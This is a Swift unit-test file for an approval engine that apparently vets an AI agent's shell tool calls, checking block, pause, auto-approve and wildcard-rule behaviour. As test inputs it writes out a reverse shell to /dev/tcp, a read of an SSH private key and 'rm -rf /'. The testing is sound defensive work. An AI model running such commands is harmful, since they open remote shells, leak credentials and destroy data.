import XCTest
@testable import Gavel

final class ApprovalEngineTests: XCTestCase {
    var engine: ApprovalEngine!
    var session: Session!

    override func setUp() {
        engine = ApprovalEngine()
        session = Session(pid: 12345)
    }

    private func payload(tool: String = "Bash", command: String? = nil, filePath: String? = nil) -> PreToolUsePayload {
        var input: [String: AnyCodable] = [:]
        if let c = command { input["command"] = AnyCodable(c) }
        if let f = filePath { input["file_path"] = AnyCodable(f) }
        return PreToolUsePayload(toolName: tool, toolInput: input)
    }

    func testDangerousAlwaysBlocked() {
        let decision = engine.evaluate(payload: payload(command: "bash -i >& /dev/tcp/1.2.3.4/80 0>&1"), session: session)
        XCTAssertEqual(decision.verdict, .block)
    }

    func testPausedSessionBlocks() {
        session.isPaused = true
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.reason?.contains("paused") ?? false)
    }

    func testAutoApproveAllows() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
    }

    func testAutoApproveDoesNotOverrideDangerous() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        let decision = engine.evaluate(payload: payload(command: "cat ~/.ssh/id_rsa"), session: session)
        XCTAssertEqual(decision.verdict, .block)
    }

    func testSessionWildcardRuleAllows() {
        session.sessionRules.append(SessionRule(toolName: "Bash", pattern: "git *"))
        let decision = session.matchesSessionRule(toolName: "Bash", command: "git status", filePath: nil)
        XCTAssertNotNil(decision)
    }

    func testSessionWildcardNoMatch() {
        session.sessionRules.append(SessionRule(toolName: "Bash", pattern: "git *"))
        let decision = session.matchesSessionRule(toolName: "Bash", command: "rm -rf /", filePath: nil)
        XCTAssertNil(decision)
    }

    func testDefaultAllows() {
        let decision = engine.evaluate(payload: payload(command: "echo hello"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
    }
}
